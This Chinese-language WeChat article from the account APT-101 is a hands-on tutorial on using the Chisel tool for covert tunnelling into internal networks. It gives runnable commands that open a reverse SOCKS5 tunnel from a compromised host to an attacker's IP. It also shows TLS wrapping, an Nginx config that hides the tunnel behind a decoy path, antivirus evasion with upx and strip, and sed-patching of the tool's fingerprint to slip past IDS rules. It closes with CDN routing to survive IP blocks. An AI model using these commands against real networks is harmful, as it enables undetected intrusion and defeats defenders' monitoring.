---
title: 进阶：Chisel 隧道技术与内网穿透防护绕过实战
url: https://mp.weixin.qq.com/s/XuiAIYrDbIpvCM4bE7W-Gg
source: Doonsec's feed
date: 2026-04-01
fetch_date: 2026-04-02T04:23:38.900177
---

# 进阶：Chisel 隧道技术与内网穿透防护绕过实战

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/PIWj1VguNovZSqhzFRZEVqibOSibCxHg091nBTzaDIUClqSjYR5gJ14WRjttpNd29BeLsuaBxnStH4uUhiabicYjxNrLxeoGatiaCsI2N1emQFSg/0?wx_fmt=jpeg)

# 进阶：Chisel 隧道技术与内网穿透防护绕过实战

原创

APT-101
APT-101

APT-101

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNovFmClsmic9NGsRkS2WQhKe55mQaQA8deiap4LRVywNKb0jhyN4BYaGRalIG1C1WEv5TlicmD6GiajSOEMXuu7Lmc9tzU8kcaFNdWQ/640?wx_fmt=png&from=appmsg)

在红蓝对抗与渗透测试的深水区，建立稳定且隐蔽的内网隧道是“漫游”目标网络的关键。传统的工具如 `lcx`、`htran` 或简单的 `nc` 在面对具备 HTTPS 深度包检测（DPI）和严格出站策略的现代化防火墙时，往往显得捉襟见肘。

今天我们要深度拆解一款被称为内网穿透“瑞士军刀”的工具——**Chisel**。它不仅基于 WebSocket 协议，具备极强的穿透力，更能通过 TLS 封装与 Nginx 反向代理，将流量伪装成合法的网页浏览，实现真正的“大隐隐于市”。

---

### 一、 为什么选择 Chisel？

Chisel 是一个基于 Go 语言编写的快速隧道工具，它将 TCP 流量封装在 HTTP 隧道中，并利用 WebSocket 进行传输。其核心优势在于：

* **单文件绿色化**：无需安装环境，跨平台支持极佳。
* **WebSocket 协议**：流量特征符合标准 HTTP/2 握手，天然适配 CDN 和负载均衡。
* **安全性**：内置指纹校验（Fingerprint）与认证，防止隧道被公网扫描器非法占用。
* **高可用性**：支持多路复用与自动指数退避重连，网络波动时表现极稳。

> **免杀小贴士**：在实战中，建议使用 `upx -9` 压缩体积，并配合 `strip` 命令抹除符号信息，能有效避开大多数基础杀软的特征扫描。

---

### 二、 核心实战：反向 SOCKS5 代理

这是渗透测试中最常用的模式。通过在攻击机开启服务端，受控机反向连接，即可在攻击机上开启一个通往目标全内网的 SOCKS5 隧道。

#### 1. 攻击机（Server）部署

```
# 监听 8080 端口，并开启反向隧道功能 (--reverse)./chisel_1.11.5_linux_amd64 server -p 8080 --reverse
```

#### 2. 受控机（Client）连接

```
# R:socks 表示在服务端开启默认 1080 端口的代理./chisel_1.11.5_linux_amd64 client <攻击机_IP>:8080 R:socks
```

执行后，你只需在攻击机配置 `proxychains` 指向 `127.0.0.1:1080`，即可直接访问目标内网的域控、数据库等任何资源。

这种方式基本可被主流的IPS类的设备检测到。

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNosPK7yFqGpnurYAY2xU0n2tJI5swgxzeH0LRUicqgWHGxIepWZUemLHfJYTHzOrpkeBkL5GbmfSplVEOfTDJICwmm92FJVIvVcE/640?wx_fmt=png&from=appmsg)

---

### 三、 进阶防护绕过：WebSocket over TLS

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNouKd5E3mJzpbWAXm5CKeJJmPWSC8rKvBB4AIuD53xibrJWL2VHA0icc9C2EvTRiah4Eo0MeYCFZAV5kvib93ZCVaW4sVrgxauuVy5w/640?wx_fmt=png&from=appmsg)

如果目标内网部署了高级防火墙或 IDS，非加密的 HTTP 隧道极易被截断。此时，我们需要给隧道套上一层 **HTTPS（TLS）** 的外壳。

#### 方案一：自签名证书模式（快速部署）

这种方式最简单，能抹除 Chisel 默认的握手特征，使流量在防火墙眼中变为 443 端口的加密数据。

1. **生成证书**： `openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout server.key -out server.crt`
2. **服务端启动**： `sudo ./chisel_1.11.5_linux_amd64 server -p 443 --tls-key server.key --tls-cert server.crt --reverse`
3. **客户端连接**： `./chisel_1.11.5_linux_amd64 client https://<IP>:443 R:socks`

#### 方案二：Nginx 反向代理（极致隐蔽）

这是目前公认最稳、最隐蔽的方案。其逻辑是将 Chisel 服务端隐藏在合法的 Nginx 之后，配合商用证书和路径混淆，实现流量的“完美伪装”。

**配置逻辑拆解：**

1. **服务端启动 Chisel**：仅监听本地 9443 端口。
2. **Nginx 转发配置**：利用 Nginx 匹配特定路径（如 `/news/update`），将 WebSocket 流量转发至后台。

```
location /news/update {     proxy_pass http://127.0.0.1:9443;    proxy_http_version 1.1;    proxy_set_header Upgrade $http_upgrade;    proxy_set_header Connection "upgrade";}
```

1. **客户端连接**：直接连接域名的 443 端口。 `./chisel_1.11.5_linux_amd64 client https://your-domain.com R:socks`

经过TLS加密处理之后，安全设备是无法检的

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNosq3Nzia4bkUuyH3zujCPnd9TeJ8axQ4RIGykoaLg9RAhRCgZicBrThCiaRt6wMKqRsAicbvdTTppIicr0aqqfr0oUP7LNzAiagEn7r8/640?wx_fmt=png&from=appmsg)

方案三：剔除检测指纹信息

检测告警特征

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNosFAWtiaZiavxLJspq0JogkMqN0sTUAXHSS9icWrOSIbLaevYIPDYY61yDm0CoRFFD8ziaYqibcLoaFo9h9L1AkMZqib8eXPfxJkRiaR4/640?wx_fmt=png&from=appmsg)

```
strings chisel_1.11.5_linux_amd64 | grep "chisel-v"sed -i 's/chisel-v3/test-abc1/g' chisel_1.11.5_linux_amd64
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PIWj1VguNoubpcEnG1SyqFffHMlAzVAV4vyqTCCznGaFwfHakYmYNo9XgaylrzT6xnib5sOlicoEjes0gVaIzgLGz1qh3YK8myicZicPYTCScicA/640?wx_fmt=png&from=appmsg)

这种简单的方式，安全设备如果检测规则依赖于指纹，也是可以绕过。

---

### 四、 总结：绕过原理与实战价值

为什么 Nginx + Chisel 的方案如此强悍？

1. **特征彻底抹除**：安全设备只能看到标准 Nginx 的 TLS 握手，这是全网最通用的流量特征，拦截风险极低。
2. **路径混淆防御**：管理员手动访问域名只会看到普通的欢迎页。只有访问特定的“伪装路径”才会触发隧道。
3. **兼容 CDN/域前置**：由于符合标准协议，你可以轻松将流量挂载到 Cloudflare 等 CDN 后，即便攻击机 IP 被封，隧道依然可以通过 CDN 全球边缘节点穿透回来。

在复杂的内网防护环境下，掌握 Chisel 的进阶用法，不仅仅是学会一款工具，更是理解**流量封装与协议伪装**的核心思想。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/vgGymHXkYlHxHm5eWcF04Jiak4wbaPHuibiaRpMSS9cibMpn8zszwAmT9Oc2YYhJN1nowIDPnEgAddjclhcuDOaZtQ/0?wx_fmt=png)

APT-101

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/vgGymHXkYlHxHm5eWcF04Jiak4wbaPHuibiaRpMSS9cibMpn8zszwAmT9Oc2YYhJN1nowIDPnEgAddjclhcuDOaZtQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过